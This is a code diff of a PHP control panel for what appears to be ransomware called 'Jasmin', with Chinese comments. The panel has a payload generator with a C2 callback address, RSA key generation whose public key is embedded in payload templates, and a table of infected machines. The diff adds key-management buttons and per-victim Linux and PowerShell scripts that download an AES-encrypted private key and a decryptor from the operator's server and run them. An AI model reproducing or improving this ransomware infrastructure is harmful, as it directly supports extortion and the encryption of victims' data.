@@ -70,10 +70,61 @@ $csrf = csrf_token();
 
 <?php
 $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$_SERVER['HTTP_HOST'];
+// 解密口令: 内嵌进"一键解密"命令，配合 .pem.enc 走 AES-256-CBC 解密链路
+// (明文 .pem 与 .key_secret 已被 .htaccess 403，不能直接 curl)
+$aes_pwd = is_file(__DIR__.'/payloads/.key_secret') ? trim(file_get_contents(__DIR__.'/payloads/.key_secret')) : 'KEY_NOT_SET';
 ?>
 <!-- 载荷生成器 -->
 <section class="panel" id="panel-gen">
 <h2><i class="fas fa-virus"></i> 载荷生成器</h2>
+
+<?php
+// ── 密钥管理 ────────────────────────────────────────────────
+// 早期版本「下载私钥」是 payloads/jasmin_private.pem 直链，被 .htaccess 403 拦截
+// 而 download_file.php 当时只放行 passwords/ → 必然「下载失败」。
+// 现全部改走需登录的 download_file.php。
+$__pdir = __DIR__ . '/payloads';
+$__has_key = is_file($__pdir . '/jasmin_private.pem.enc');
+$__fp = '';
+if ($__has_key) {
+    $__pt = @file_get_contents($__pdir . '/jasmin_public.pem');
+    if ($__pt !== false) $__fp = substr(hash('sha256', $__pt), 0, 16);
+}
+$__kfiles = [
+    ['payloads/jasmin_private.pem',     '私钥 (.pem 明文)',   'fa-key',           '#ef4444'],
+    ['payloads/jasmin_private.pem.enc', '私钥 (AES 加密)',    'fa-lock',          '#f59e0b'],
+    ['payloads/.key_secret',            '解密口令',           'fa-unlock-alt',    '#8b5cf6'],
+    ['payloads/jasmin_public.pem',      '公钥',               'fa-shield-alt',    '#4dc3fa'],
+];
+?>
+<div class="key-mgr<?= $__has_key ? '' : ' key-mgr-empty' ?>">
+  <?php if ($__has_key): ?>
+  <div class="key-mgr-head">
+    <span class="key-dot"></span> <b>密钥已就绪</b>
+    <span class="key-fp">公钥指纹 SHA256: <?= h($__fp) ?>…</span>
+  </div>
+  <div class="key-mgr-btns">
+    <?php foreach ($__kfiles as [$__f, $__label, $__icon, $__color]):
+      $__exists = is_file(__DIR__ . '/' . $__f); ?>
+      <?php if ($__exists): ?>
+      <a class="btn btn-red key-btn" style="background:<?= $__color ?>" href="download_file.php?file=<?= urlencode($__f) ?>">
+        <i class="fas <?= $__icon ?>"></i> 下载<?= $__label ?>
+      </a>
+      <?php endif; ?>
+    <?php endforeach; ?>
+  </div>
+  <div class="key-mgr-note">
+    <i class="fas fa-info-circle"></i>
+    受害者端解密：用 <code>.pem.enc</code> + <code>解密口令</code>（AES-256-CBC 解出 .pem）走加密链路；
+    或直接用<b>明文私钥</b> <code>sh jasmin_decrypt_openssl.sh key.pem /</code>。
+    口令与明文私钥仅能在登录后台后下载，直接 URL 访问一律 403。
+  </div>
+  <?php else: ?>
+  <div class="key-mgr-head"><span class="key-dot off"></span> <b>尚未生成密钥对</b>
+    <span class="key-fp">生成后才能加密数据 —— 请点击下方「生成RSA密钥对」</span></div>
+  <?php endif; ?>
+</div>
+
 
 <div class="gen-opts" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:20px">
   <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="<?=h($server_url)?>/handshake.php"></div>
@@ -180,17 +231,41 @@ $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http'
 <?php if(isset($_GET['dec'])&&$_GET['dec']==$vid):?>
 <tr><td colspan="11" id="dec-row-<?=$vid?>" class="dec-expand">
 <?php if($is_linux):?>
-<pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密
+<pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 私钥AES加密传输
+K="<?=$aes_pwd?>"
 pip3 install -q cryptography 2>/dev/null
-curl -sL <?=$server_url?>/payloads/jasmin_private.pem -o /tmp/.jk
+curl -sL <?=$server_url?>/payloads/jasmin_private.pem.enc -o /tmp/.jke
 curl -sL <?=$server_url?>/payloads/jasmin_decrypt.py -o /tmp/.jd
+python3 -c "
+import base64
+from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
+from cryptography.hazmat.backends import default_backend
+raw=base64.b64decode(open('/tmp/.jke').read())
+iv,ct=raw[:16],raw[16:]
+c=Cipher(algorithms.AES(bytes.fromhex('$K')),modes.CBC(iv),default_backend()).decryptor()
+pt=c.update(ct)+c.finalize()
+open('/tmp/.jk','wb').write(pt[:-pt[-1]])
+"
 python3 /tmp/.jd /tmp/.jk
-rm -f /tmp/.jk /tmp/.jd</pre>
+rm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>
 <?php else:?>
-<pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密
+<pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 私钥AES加密传输
 $tmp="$env:TEMP\jasmin_dec"
 New-Item -ItemType Directory -Force -Path $tmp | Out-Null
-Invoke-WebRequest "<?=$server_url?>/payloads/jasmin_private.pem" -OutFile "$tmp\key.pem"
+$k="<?=$aes_pwd?>"
+Invoke-WebRequest "<?=$server_url?>/payloads/jasmin_private.pem.enc" -OutFile "$tmp\key.enc"
+# AES解密私钥
+$raw=[Convert]::FromBase64String((Get-Content "$tmp\key.enc" -Raw))
+$iv=$raw[0..15]; $ct=$raw[16..($raw.Length-1)]
+$aes=[System.Security.Cryptography.Aes]::Create()
+$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($k)
+$aes.IV=[byte[]]$iv; $aes.Padding="PKCS7"; $aes.Mode="CBC"
+$dec=$aes.CreateDecryptor()
+$ms=New-Object IO.MemoryStream(,[byte[]]$ct)
+$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,"Read")
+$sr=New-Object IO.StreamReader($cs)
+[IO.File]::WriteAllText("$tmp\key.pem",$sr.ReadToEnd())
+$sr.Close();$cs.Close();$ms.Close()
 Invoke-WebRequest "<?=$server_url?>/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
 & "$tmp\dec.exe" "$tmp\key.pem"
 Remove-Item -Recurse -Force $tmp</pre>
@@ -332,7 +407,7 @@ function genKey(){
   var r=document.getElementById('key-result');
   r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成RSA-2048密钥对...</span>';
   fetch('keygen.php',{method:'POST',body:new URLSearchParams({csrf_token:'<?=$csrf?>'})}).then(x=>x.json()).then(d=>{
-    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-key"></i> '+d.msg+'<br><br><b>公钥 (内置到载荷模板):</b><pre class="dt-code" style="margin-top:8px;max-height:120px;overflow:auto;font-size:.72rem">'+d.pub+'</pre><div style="margin-top:8px"><a href="payloads/jasmin_private.pem" download class="btn btn-red" style="display:inline-flex"><i class="fas fa-download"></i> 下载私钥</a> <a href="payloads/jasmin_public.pem" download class="btn btn-red" style="display:inline-flex;background:#4dc3fa"><i class="fas fa-download"></i> 下载公钥</a></div></div>';}
+    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-key"></i> '+d.msg+'<br><br><b>公钥 (内置到载荷模板):</b><pre class="dt-code" style="margin-top:8px;max-height:120px;overflow:auto;font-size:.72rem">'+d.pub+'</pre><div style="margin-top:8px"><a href="download_file.php?file=payloads%2Fjasmin_private.pem" class="btn btn-red" style="display:inline-flex"><i class="fas fa-download"></i> 下载私钥</a> <a href="download_file.php?file=payloads%2Fjasmin_private.pem.enc" class="btn btn-red" style="display:inline-flex;background:#f59e0b"><i class="fas fa-lock"></i> 下载加密私钥</a> <a href="download_file.php?file=payloads%2F.key_secret" class="btn btn-red" style="display:inline-flex;background:#8b5cf6"><i class="fas fa-unlock-alt"></i> 下载解密口令</a> <a href="download_file.php?file=payloads%2Fjasmin_public.pem" class="btn btn-red" style="display:inline-flex;background:#4dc3fa"><i class="fas fa-download"></i> 下载公钥</a> <span style="font-size:.76rem;color:#94a3b8;margin-left:10px">刷新页面可见顶部「密钥管理」</span></div></div>';}
     else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
   }).catch(e=>{r.innerHTML='<div class="gen-err">'+e+'</div>';});
 }
